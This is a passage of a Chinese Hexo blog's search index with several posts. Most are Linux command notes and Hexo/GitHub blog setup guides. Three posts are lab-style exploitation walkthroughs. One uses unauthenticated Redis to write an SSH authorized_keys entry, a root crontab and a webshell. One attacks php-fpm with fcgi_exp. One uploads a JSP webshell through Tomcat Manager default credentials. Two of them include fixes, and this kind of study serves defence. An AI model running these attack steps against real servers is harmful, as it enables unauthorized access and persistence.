进程查看/管理查看当前所运行的程序 top ps查看当前所有root运行的程序 ps aux | grep root结束一个进程kill -9 进程号 强制结束一个进程 结束所有相同名字的进程killall +进程名 计划任务查看当前计划任务 crontab -l普通用户添加计划任务 crontab -e crontab -e -u 普通用户名root用户给普宁共同用户添加一条计划任务 vim /etc/crontab删除计划任务 /etc/crontab 下删除 -r删除那个进程计划任务添加格式 分 时 日 月 周 命令 压缩包解压/压缩压缩所有/etc下的文件，到/tmp/etc.tar.gztar -zcvf /tmp/etc.tar.gz /etc 解压/tmp/etc.tar.gz？tar -zxvf /tmp/etc.tar.gz 压缩包压缩集中压缩格式gzip -zbzip2 -jcropress -Z 不解压，查看/tmp/etc.tar.gz压缩包里的所有文件tar -ztf /tmp/etc.tar.gz 软件的安装集中软件安装的方法rpm yumapt-getwget yumyum search 软件名yum install 软件名yum list installedyum remove 软件名 rpm-ivh：安装显示安装进度 –install –verbose –hash-Uvh：升级软件包 –Update-qpl：列出RPM软件包内的文件信息（Query Package list）-qpi：列出RPM软件包的描述信息（Query Package install package（s））-qf：查看指定文件属于哪个RPM软件包[Query File]-Va：校验所有的RPM软件包，查找丢失的文件[View Lost]-qa：查看所有安装的软件-e：删除包 手动安装软件./configure(生成makefile文件)执行make进行编译执行make install进行安装，调用makefile中的代码块，把编译出来的二进制文件，库，配置文件放到相应的目录下最后make clean清除编译结果 时钟硬件时钟系统：主板上的时钟设置hwclock –show 系统时间date 时间戳自1970年1月1日以来的秒数 查看硬件时钟系统时间 hwclock –show 相互同步-systohc #将硬件时钟调整为与目前的系统时钟一致-hctosys #将系统时钟调整为与目前的硬件时钟一致 联网同步时间ntpdate time.nist.gov 系统信息及运行状态df命令用来检查linux服务器的文件系统的磁盘空间占用情况。可以获取磁盘被占用了多少空间以及目前还剩下多少空间信息。1234567891011-a 全部文件系统列表-h 方便阅读方式显示-H 等于-h 但是计算方式1k-1000-i 显示inode信息-k 区块为1024字节-l只显示本地文件系统-m 区块为1048576字节--no-sync 忽略sync命令-P 输出合适为POSIX--sync 在取得磁盘信息前，先执行sync命令-T 文件系统类型 du命令对文件和目录对磁盘空间的使用情况的查看 iostat查看网卡、CPU、磁盘等设备信息。 /proc目录存放各种数据映像， proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。主要存放一些系统内核的配置文件。/proc/cpuinfo 本机CPU的相关信息/proc/meminfo 本机内存及交换分区的使用信息/proc/modules 本机已安装的硬件模块信息/proc/mounts 本机已经挂载上的设备信息 服务与开机自启动服务：后台运行的一些程序 服务启动/停止service 服务名称 start/stop httpd 服务开机自启动设置chkconfig –level 345 httpd on 取消iptables服务开机自启动chkconfig –level 345 iptables off 等级0表示：表示关机 等级1表示：单用户模式 等级2表示：无网络连接的多用户命令行模式 等级3表示：有网络连接的多用户命令行模式 等级4表示：不可用 等级5表示：带图形界面的多用户模式 等级6表示：重新启动 sed主要以行为单位进行处理，将数据增删改查选取等。。。 选项与参数：-n ：使用安静模式。在一般sed用法中，所有来自STDIN的数据一般都会被列出到终端上。但是如果加上-n 参数后吗，则是只有sed特殊处理的那一行（或动作）才会被列出来。-e ：直接在指令模式上云行，sed动作的编辑；-f ：直接将sed的动作写在一个文件内，- f filename 则可以运行 filename 内的sed动作；-r ：sed的动作支持的是延伸正规表达发的语法。（默认是基础正则表示法语法）；-i ：直接修改读取的文件内容，而不是输出到终端。 动作说明：[ n1[ ,n2 ] ] functionn1，n2 ：不见得hi存在，一般代表【选择进行动作的行数】，举例来说，如果我的动作是需要在10到20行之间进行的，则【10，20[ function ]】 function:a ：新增，新增的内容在目前的下一行出现（目前的下一行）；c : 取代，c的后面可以接字串，这些字串可以取代n1,n2之间的行d ：删除，d的后面通常不接任何东西；i ： 插入，i的后面可以接字串，而这些字串会在新的一行出现（目前的上一行）p ：列印，即将某个选择的数据印出。通常p会与参数 sed -n 一起运行s ：取代，通常此动作可以搭配正则表达式 文件/文件夹查找find locat whereis whichfind -name 文件名文件名权限 find 文件路径 -perm 权限 | xargs ls -alfind 目录 -perm 权限 -exec ls -al{} \; 文件内容匹配查找nl 文件路径 | grep 内容 显示/etc/passwd包含root的行cat /etc/passwd | grep root awk强大的编程搜索工具 例：cat /etc/passwd | awk -F ‘:’ ‘{print $1}’ 参数：-F z指定分隔符]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Redis未授权访问]]></title>
      <url>%2F2016%2F11%2F29%2FRedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
      <content type="text"><![CDATA[漏洞概述Redis是一个开源的、支持网络、基于内存、键值对（key-value）存储数据库，提供多种语言的API，使用ANSI C编写。 Redis手动编译安装，默认的配置允许外部链接并且没有密码。如果Redis运行在root权限上，可以写任意文件。Redis默认开放端口是6379。 Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。一句话总结：对公网开放，且未启用认证的redis服务器利用 Redis 自身的提供的 config 命令，可以进行写文件操作。 安装Redis安装依赖程序12yum install wgetyum install gcc 获取安装文件、解压、进入目录123wget http://download.redis.io/releases/redis-3.2.3.tar.gztar -xzf redis-3.2.3.tar.gzcd redis-3.2.3 编译安装1make 如果没有提前安装gcc，编译时会报出以下错误： make distclean 删除上次编译产生的垃圾文件make 1make install 设置配置文件路径12mkdir -p /etc/rediscp redis.conf /etc/redis/redis.conf 修改配置文件(1)port 6379。这里可以修改端口，我不做修改 (2)是否已后台进程运行 daemonize on —-》yes (3)允许其他IP地址访问，默认的是只有本机可以访问 bind 127.0.0.1 —-》0.0.0.0 启动1/usr/local/bin/redis-server /etc/redis/redis.conf 查看启动情况 使用客户端redis-cli 漏洞利用 要求：能够利用运行在Root权限上的未授权的Redis进行任意文件写入 写webshell客户端连接服务器端：redis-cli -h 目标IP地址 -p 6379在其web路径下写入一个php文件： 查看键值fllow的值： 访问成功： 写入webshell步骤跟这一样，写入的是一句话木马。 写ssh 免密码登录原理：利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。 环境：本地主机：kali 目标主机：远程VPN Centos (1)准备工作，如果已经安装这些此步可省 ** yum install ssh –&gt;安装SSH协议 yum install rsync –&gt;rsync是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件 service sshd restart –&gt;启动服务** (2)生成秘钥对1ssh-keygen –t rsa –P &apos;&apos; 生成的密钥对：id_rsa和id_rsa.pub默认存储在”/home/用户/.ssh”目录或者root用户/root/.ssh/。 (3)把公钥放到目标服务器上（~/.ssh/authorized_keys）,自己保留好私钥把id_rsa.pub追加到授权的key里：1cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys 修改授权key的权限1chmod 600 ~/.ssh/authorized_keys (4)查看生成的公钥： (5)本地redis客户端连接目标服务器：1redis-cli -h 目标IP -p 6379 (6)写入ssh公钥123config set dir /root/.ssh/config set dbfilename authorized_keysset xxxx &quot;\n\n\nssh-rsa key_pub\n\n\n&quot; 其中key_pub为上图生成的公钥，即可将公钥保存在远端服务器，使得登录时不需要输入账号与密码。 1Save (7)ssh 目标IP 或者 ssh -i is_rsa root@目标IP 连接成功！！！ 写计划任务crontab -e命令来添加计划任务，即编辑/var/spool/cron下对应的用户的文件。1234config set dir /var/spool/cronconfig set dbfilename rootset cron &quot;\n\n*/1 * * * * date &gt;&gt; /tmp/55.txt\n\n&quot;save Cat /tmp/55.txt 修复方案指定redis服务使用的网卡(需要重启redis才能生效)在 redis.conf 文件中找到 “# bind 127.0.0.1” ，把前面的#号去掉，然后保存。注：修改后只有本机才能访问Redis。 设置访问密码(需要重启redis才能生效)在 redis.conf 中找到“requirepass”字段，在后面填上你需要的密码，Redis客户端也需要使用此密码来访问Redis服务。 修改Redis服务运行账号(需要重启redis才能生效)请以较低权限账号运行Redis服务，且禁用该账号的登录权限。另外可以限制攻击者往敏感写入文件，但是Redis数据还是能被黑客访问到，或者被黑客恶意删除。 设置防火墙策略如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用fcgi_exp对php-fpm进行远程利用]]></title>
      <url>%2F2016%2F11%2F19%2F%E5%88%A9%E7%94%A8fcgi-exp%E5%AF%B9php-fpm%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8%2F</url>
      <content type="text"><![CDATA[&gt; PHP-FPM是一个PHPFastCGI管理器，是只用于PHP的。 Php-fpm环境搭建nginx + php-pfm 搭建好了之后配置php-fpm1sudo vim /etc/php-fpm.d/www.conf 12Listen=0.0.0.0:9000 (修改); listen.allowed_clients = 127.0.0.1 (前面添加注释 分号) 搭建nginx + php-fpm 环境 1yum install php-fpm 安装golang123cd /usr/local/src/wget -c http://golangtc.com/static/go/go1.4beta1.linux-amd64.tar.gztar zxvf /root/go1.4beta1.linux-amd64.tar.gz 设置系统环境变量 vim /etc/profile 123export GOROOT=/usr/local/src/goexport GOBIN=$GOROOT/binexport PATH=$PATH:$GOBIN 编译使其生效：1source /etc/profile 验证：1go version 安装fcgi_exp1[root@localhost go]#go build /usr/local/fcgi_exp/fcgi_exp.go 至此，测试环境搭建完成！ 漏洞利用nmap扫描查看9000端口是否开启关闭防火墙:Service iptables stop 查id 尝试向web路径下写文件1vim /etc/nginx/nginx.conf 通过nginx的配置文件查找到web路径：/usr/share/nginx/html 1echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; /usr/share/nginx/html/2.php 尝试写入phpinfo1./fcgi_exp phpinfo 192.168.141.110 9000 /usr/share/nginx/html/1.php &gt; 1.html fcgi_exp目录下会生成1.html vim 1.html 查看服务器配置信息。 但是依旧不能读取文件：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Tomcat Manager管理界面Getshell]]></title>
      <url>%2F2016%2F11%2F19%2FTomcat-Manager%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2Getshell%2F</url>
      <content type="text"><![CDATA[0x00【课前小菜】1、Apache是web服务器，html容器，可同构插件支持php；2、Tomcat是应用（java）服务器，jsp/servlet容器，用于发布jsp以及java的；3、Apache可以单方向的访问Tomcat的资源；4、Tomcat manager/html弱口令管理界面 （tomcat—tomcat，admin–admin） 0x01【课上消化】登录：http://10.22.66.6:8080/manager/html用户名和密码：tomact tomact zipzip.jsp =========》zipzip.zip ========》zipzip.war 压缩 修改压缩包后缀 注：这里需要说明一下，压缩的时候.rar格式是不能上传成功的。。。 上传成功后会自动生成一个与压缩包同名的文件。 访问该刚上传的文件：http://10.22.66.6:8080/zipzip/zipzip.jsp 输入密码“admin”回车，即可访问通过webshell得到服务器权限。服务器的一些信息: 执行命令 文件操作 0x03【修补漏洞】漏洞根源Tomcat漏洞是由于tomcat-users.xml文件引起的。该文件保存了Tomcat后台登录的用户和密码，并且在默认状态下成功的登录者获得的是manager权限即管理员权限。下面是默认状态下的tomcat-users.xml文件的部分内容：该文件路径： /opt/apache-tomcat-8.5.4/conf/tomcat-users.xml 漏洞修补1234A.改用户名和密码B.修改权限 &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt; 去掉roles属性里的manager，然后重启tomcat。因为tomcat重启时会重新加载配置文件。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hexo搭建GitHub博客（三）- Next主题配置使用]]></title>
      <url>%2F2016%2F11%2F18%2FHexo%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%89%EF%BC%89-Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[NexT是一款简洁优雅且易于使用的主题，配置比较简单，只需要稍微修改配置文件即可，功能也比较全，分类、归档、标签显示明了，让人一看就知道干嘛的。 NexT主题官方文档还算详细，但是有些部分的介绍不够详细，这里我做部分补充，并对自己做了修改的部分作介绍。 Hexo 有两份主要的配置文件（_config.yml），一份位于站点根目录下，另一份位于主题目录下。为了描述方便，在以下说明中，将前者称为站点配置文件，后者称为主题配置文件。 NexT主题安装下载NexT主题12$ cd your-hexo-site`$ git clone https://github.com/iissnan/hexo-theme-next themes/next 修改站点配置文件修改站点配置文件_config.yml，找到以下部分 1234# Extensions## Plugins: http://hexo.io/plugins/## Themes: http://hexo.io/themes/theme: landscape 修改为 12345# Extensions## Plugins: http://hexo.io/plugins/## Themes: http://hexo.io/themes/# theme: landscapetheme: next 至此，NexT主题就安装好了，非常方便，在Hexo中切换主题只需修改站点配置文件中theme属性来配置，想换就换。 选择SchemeNexT 通过 Scheme 提供主题中的主题。Mist是NexT主题自带的主题，可以通过修改主题配置文件中的scheme属性获得。 12# Schemesscheme: Mist #去掉默认的注释即可切换为Mist主题 默认主题: Mist主题： 菜单设置NexT主题菜单设置，用于设置博客上方导航栏，在主题配置文件中修改。 1234567menu: home: / #主页 categories: /categories #分类页（需手动创建） #about: /about #关于页面（需手动创建） archives: /archives #归档页 tags: /tags #标签页（需手动创建） #commonweal: /404.html #公益 404 （需手动创建） 只是在menu选项中设置还不能让标签页面、分类页面生效，需要我们手动创建 标签页面1&gt;运行以下命令 1hexo new page &quot;tags&quot; 同时，在/source目录下会生成一个tags文件夹，里面包含一个index.md文件2&gt;修改/source/tags目录下的index.md文件 12345title: tagsdate: 2015-09-29 14:37:02type: &quot;tags&quot;--- 3&gt;修改主题配置文件去掉tags的注释 1234567menu: home: / #主页 categories: /categories #分类页（需手动创建） #about: /about #关于页面（需手动创建） archives: /archives #归档页 tags: /tags #标签页（需手动创建） #commonweal: /404.html #公益 404 （需手动创建） 分类页面1&gt;运行以下命令 1hexo new page &quot;categories&quot; 同时，在/source目录下会生成一个categories文件夹，里面包含一个index.md文件2&gt;修改/source/categories目录下的index.md文件 12345title: categoriesdate: 2015-09-29 14:47:21type: &quot;categories&quot;--- 3&gt;修改主题配置文件去掉categories的注释 1234567menu: home: / #主页 categories: /categories #分类页（需手动创建） #about: /about #关于页面（需手动创建） archives: /archives #归档页 tags: /tags #标签页（需手动创建） #commonweal: /404.html #公益 404 （需手动创建） 侧边栏头像设置编辑站点配置文件，增加avatar字段 12# 头像avatar: /images/avatar.png 头像图片须放置在主题的/source/images/目录下 多说评论系统使用多说前要注册自己的多说账号，并创建一个站点。 1&gt; 登录-&gt;选择首页的”我要安装” 2&gt; 创建站点 红色所指部分是你的duoshuo_shortname（如：我的duoshuo_shortname就是zhiho）3&gt; 修改站点配置文件在站点配置文件中增加duoshuo_shortname字段，duoshuo_shortname就是上一步中你填写的值。 12# 多说duoshuo_shortname: zhiho 至此，当你重新访问你的博客时，在每篇博文后面就会有多说的评论框。但是，你会发现在分类页和标签页也会看到评论框，如果你感觉不爽可以通过下面的方法去掉。 去除分类页标签页多说评论修改站点的/source/categories/目录下的index.md文件 1234title: categoriesdate: 2015-09-18 21:46:42type: &quot;categories&quot;comments: false #去除多说评论框 同样修改站点的/source/tagss/目录下的index.md文件即可去掉标签页的评论框 站点访问计数站点访问计数我使用的是不蒜子使用非常方便，只需一行脚本+一行标签 显示站点总访问量我们使用的是hexo，所以要找到网站的布局文件，不同的主题的布局文件可能不一样，下面教程是针对NexT主题做出的修改。找到站点的themes/next/layout/_partials目录下的footer.swig文件将以下脚本和标签插入到文件中 1234&lt;script async src=&quot;https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;本站总访问量 &lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt; &amp;nbsp&amp;nbsp&amp;nbsp您是第&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;个来到的小伙伴 插入到这里 1234567891011121314&lt;div class=&quot;powered-by&quot;&gt; &#123;&#123; __(&apos;footer.powered&apos;, &apos;&lt;a class=&quot;theme-link&quot; href=&quot;http://hexo.io&quot;&gt;Hexo&lt;/a&gt;&apos;) &#125;&#125;&lt;/div&gt;&lt;div class=&quot;theme-info&quot;&gt; &#123;&#123; __(&apos;footer.theme&apos;) &#125;&#125; - &lt;a class=&quot;theme-link&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt; NexT&#123;% if theme.scheme %&#125;.&#123;&#123; theme.scheme &#125;&#125;&#123;% endif %&#125; &lt;/a&gt;&lt;/div&gt;# 插入到这里&#123;% block footer %&#125;&#123;% endblock %&#125; 显示单页面访问量不蒜子目前是不支持在首页显示每篇博文的计数的，而且NexT主题中，首页文章显示跟具体文章显示会用到同一个模板文件(themes/next/layout/_macro目录下的post.swig文件)，所以我们需要稍微修改一下模板的代码。1&gt;修改themes/next/layout/_macro目录下的post.swig文件位于文件开头,在第三个参数的位置，增加is_pv字段 1&#123;% macro render(post, is_index, is_pv, post_extra_class) %&#125; 插入以下代码，用于区分文章页面跟首页这里不用像”显示站点总访问量”中那样安装脚本，否则会出现重复计数的问题。 12345&#123;% if is_pv %&#125;&lt;span&gt;&amp;nbsp; | &amp;nbsp;&lt;span id=&quot;busuanzi_value_page_pv&quot; &gt;&lt;/span&gt;次阅读&lt;/span&gt; &#123;% endif %&#125; 插入这个位置 12345678910111213141516171819202122&#123;% if post.comments %&#125; &#123;% if (theme.duoshuo and theme.duoshuo.shortname) or theme.duoshuo_shortname %&#125; &lt;span class=&quot;post-comments-count&quot;&gt; &amp;nbsp; | &amp;nbsp; &lt;a href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;#comments&quot; itemprop=&quot;discussionUrl&quot;&gt; &lt;span class=&quot;post-comments-count ds-thread-count&quot; data-thread-key=&quot;&#123;&#123; post.path &#125;&#125;&quot; itemprop=&quot;commentsCount&quot;&gt;&lt;/span&gt; &lt;/a&gt; &lt;/span&gt; &#123;% elseif theme.disqus_shortname %&#125; &lt;span class=&quot;post-comments-count&quot;&gt; &amp;nbsp; | &amp;nbsp; &lt;a href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;#comments&quot; itemprop=&quot;discussionUrl&quot;&gt; &lt;span class=&quot;post-comments-count disqus-comment-count&quot; data-disqus-identifier=&quot;&#123;&#123; post.path &#125;&#125;&quot; itemprop=&quot;commentsCount&quot;&gt;&lt;/span&gt; &lt;/a&gt; &lt;/span&gt; &#123;% endif %&#125; &#123;% endif %&#125; #插入到这里 &lt;/div&gt; &lt;/header&gt; 2&gt;修改themes/next/layout目录下的post.swig文件这个文件是文章的模板找到以下代码，给render方法传入刚才第一步中设置的参数。 1234567891011121314151617&#123;% block content %&#125; &lt;div id=&quot;posts&quot; class=&quot;posts-expand&quot;&gt; #render方法第二个参数is_index为是否为首页 #第三个参数is_pv为我们刚才设置的是否显示计数 &#123;&#123; post_template.render(page, false, true) &#125;&#125; &lt;div class=&quot;post-spread&quot;&gt; &#123;% if theme.jiathis %&#125; &#123;% include &apos;_partials/share/jiathis.swig&apos; %&#125; &#123;% elseif theme.duoshuo_shortname and theme.duoshuo_share %&#125; &#123;% include &apos;_partials/share/duoshuo_share.swig&apos; %&#125; &#123;% endif %&#125; &lt;/div&gt; &lt;/div&gt;&#123;% endblock %&#125; 3&gt;修改themes/next/layout目录下的index.swig文件这个文件是首页的模板找到以下代码，给render方法传入刚才第一步中设置的参数。 1234567891011&#123;% block content %&#125; &lt;section id=&quot;posts&quot; class=&quot;posts-expand&quot;&gt; &#123;% for post in page.posts %&#125; #render方法第二个参数is_index为是否为首页 #第三个参数is_pv为我们刚才设置的是否显示计数 &#123;&#123; post_template.render(post, true, false) &#125;&#125; &#123;% endfor %&#125; &lt;/section&gt; &#123;% include &apos;_partials/pagination.swig&apos; %&#125;&#123;% endblock %&#125; 至此，我们的站点计数功能就做好了~ sitemap插件Sitemap 可方便管理员通知搜索引擎他们网站上有哪些可供抓取的网页，有助于让别人更好地通过搜索到自己的博客。 sitemap安装配置1&gt; 安装 1$ npm install hexo-generator-sitemap --save 2&gt; 修改站点配置文件 123# Extensionsplugins:- hexo-generator-sitemap 使用以下命令后，你可以在站点的/public目录下找到一个sitemap.xml文件，这个文件就是你的站点地图，里面包含你的站点的网页地址。 12hexo cleanhexo g 提交sitemap到google参考如何向google提交sitemap sitemap.xml无法生成问题问题:使用以下命令安装sitemap插件后,按上面步骤配置，执行hexo g命令无法生成sitemap.xml文件。 1$ npm install hexo-generator-sitemap 观察发现博客根目录下的package.json文件中dependencies并没有sitemap插件的依赖。 1234567891011121314151617181920&#123; &quot;name&quot;: &quot;hexo-site&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;private&quot;: true, &quot;hexo&quot;: &#123; &quot;version&quot;: &quot;3.1.1&quot; &#125;, &quot;dependencies&quot;: &#123; &quot;hexo&quot;: &quot;^3.1.0&quot;, &quot;hexo-deployer-git&quot;: &quot;0.0.4&quot;, &quot;hexo-generator-archive&quot;: &quot;^0.1.2&quot;, &quot;hexo-generator-category&quot;: &quot;^0.1.2&quot;, &quot;hexo-generator-index&quot;: &quot;^0.1.2&quot;, &quot;hexo-generator-tag&quot;: &quot;^0.1.1&quot;, &quot;hexo-renderer-ejs&quot;: &quot;^0.1.0&quot;, &quot;hexo-renderer-marked&quot;: &quot;^0.2.4&quot;, &quot;hexo-renderer-stylus&quot;: &quot;^0.3.0&quot;, &quot;hexo-server&quot;: &quot;^0.1.2&quot; &#125;&#125; 解决方法：如果已安装sitemap插件，卸载sitemap插件 1$ npm uninstall hexo-generator-sitemap 安装sitemap插件时，加上- -save参数，如下 1$ npm install hexo-generator-sitemap --save 安装完成后，我们再查看博客根目录下的package.json文件，发现dependencies中已经有了sitemap插件，然后我们再执行hexo g命令，就能够在/public目录下找到一个sitemap.xml文件了。 baidusitemap安装配置普通的Sitemap格式不符合百度的要求，所以我们要安装以下插件1&gt; 安装 1$ npm install hexo-generator-baidu-sitemap --save 2&gt; 修改站点配置文件 1234567# Extensionsplugins:- hexo-generator-sitemap- hexo-generator-baidu-sitemapbaidusitemap: path: baidusitemap.xml 同理，使用以下命令后，你可以在站点的/public目录下找到一个baidusitemap.xml文件。 12hexo cleanhexo g 3&gt; 将baidusitemap.xml提交给百度百度搜索引擎提交入口使用hexo d命令将博客部署到github后,这里填写github上的baidusitemap.xml地址即可。 本文转载自：http://zhiho.github.io/2015/09/29/hexo-next/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hexo搭建Github博客（二）- Hexo配置和使用]]></title>
      <url>%2F2016%2F11%2F18%2FHexo%E6%90%AD%E5%BB%BAGithub%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BA%8C%EF%BC%89-Hexo%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[这篇博文主要介绍Hexo的配置安装和Hexo的常用命令，还有如何部署博客到Github。 前提条件：&gt; 电脑上已配置nodejs环境，因为要用到nodejs的包管理器npm。 Hexo安装打开Git命令行，执行如下命令npm install -g hexo 初始化博客 在电脑上建立自己的博客文件夹（如：D:\Software\Blog，这个目录就是博客根目录），然后在此目录下打开Git Bash，执行如下命令1hexo init 这是会输出 12INFO Copying data e:\HexoINFO You are almost done! Don&apos;t forget to run `npm install` before you start blogging with Hexo! 在博客根目录下会生成以下文件： * _config.yml ——是博客主要配置文件 * db.json——是博客数据库 * node_modules——是NodeJS依赖模块 * source——是博客内容以及其他页面（page）存在的目录，这个目录里面有个_post目录就是我们存放博客内容的地方，也就是存放博客内容markdown文档地方，输入hexo new “newPage”就会在这个目录建立一个名为newPage的子目录，然后在里面放入md文档，并在主题的配置文件里面添加相应栏目newPage，这样就会显示在主页面的目录上。（将在后续有所mark） * themes——是主题存放文件 至此，博客的安装部署工作基本完成了。blog就是你的博客根目录，所有的操作都在里面进行。 Hexo命令生成静态页面1hexo generate（hexo g也可以） 本地启动启动本地服务，进行文章预览调试，命令： 1hexo server （hexo s也可以） 浏览器输入http://localhost:4000/ 即可访问自己的博客（此处是预览效果），按ctrl+c停止。 创建文章启动server后，运行一下命令，可生成一篇文章，刷新http://localhost:4000/ 即可看到新生成的文章。 1hexo new &quot;new_article&quot; 同时在D:\Software\Blog\source_posts目录下生成一个“new_article ”的markdown文件，可以使用markdown语法的编辑器来编辑该文件，刷新http://localhost:4000/在本地查看效果。 生成静态网页1hexo generate 同时在博库根目录下public文件夹中生成静态文件。 部署到Github至此我们可以在本地访问自己的博客了，要部署到github上才能被别人看到。我们在本地调试好文章在推送上去。下面是部署到Github上的过程。 创建github page在自己的github中创建了自己的github page。参考Hexo 搭建Github 博客 （一）- 环境搭建 修改站点配置文件修改博客根目录下_config.yml文件： 1234# Deployment## Docs: http://hexo.io/docs/deployment.htmldeploy: type: 内容改成： 1234deploy: type: git repo: https://github.com/ZhengSY1222/zhengsy1222.github.io.git branch: master 然后执行命令： 1npm install hexo-deployer-git --save 然后执行配置命令： 1hexo deploy 过程中会提示输入你的github的账号和密码，等命令运行完成。然后再浏览器中输入http://zhengsy1222.github.io/就行了（你把zhengsy1222改成你的github账号就行了）。 部署步骤每次部署的步骤，可按以下三步来进行 123hexo clean #删除已经生成的静态页面hexo generatehexo deploy 一些常用命令1234567hexo new&quot;postName&quot; #新建文章hexo new page&quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #将.deploy目录部署到GitHubhexo help # 查看帮助hexo version #查看Hexo的版本 命令简写12345hexo s -g #生成静态文件并启动本地服务hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hexo搭建Github博客（一）- 环境搭建]]></title>
      <url>%2F2016%2F11%2F18%2FHexo%E6%90%AD%E5%BB%BAGithub%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%80%EF%BC%89-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
      <content type="text"><![CDATA[个人看法,github不图谋利，相当于一个数据源库，提供了丰富的数据库自己在做项目的过程中可以借鉴他人的开源代码，使用很方便，可以通过git 实现代码的托管，最重要的是免费使用，速度快而且还稳定，毕竟逼格那么高，就凑合着用吧，一回生，二回熟！！！ 设置Github注册github地址：https://github.com/按照提示注册就可以了，注册成功去验证邮箱。 创建github仓库仓库的名字要和你的账号对应，然后选择Create repositpry 常见成功后，会生成一个链接网址，此网址在后面配置主题时要用到。 安装Git + NodeJS环境安装Git用于推送hexo的内容到github上下载地址：https://git-scm.com/download/win打开效果是这样的： 安装NodeJS用来生成静态网页下载地址：https://nodejs.org/en/安装时保持默认配置就可以了。 进入github page页面设置页面选择settings创建一个默认的页面 直接选择Launch automatic page generator，其他东西都不用修改。 选择一个主题。 查看效果至此，github page已经创建完成，可以访问自己的站点了。如：http://zhengsy1222.github.io/效果就是上一步中你所选的主题，后面我们可以根据自己的喜好选择主题。 我选择的是next主题，后面我将继续介绍next主题的配置。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>%2F2016%2F10%2F29%2Fhello-world%2F</url>
      <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
    </entry>

    
  
  
</search>
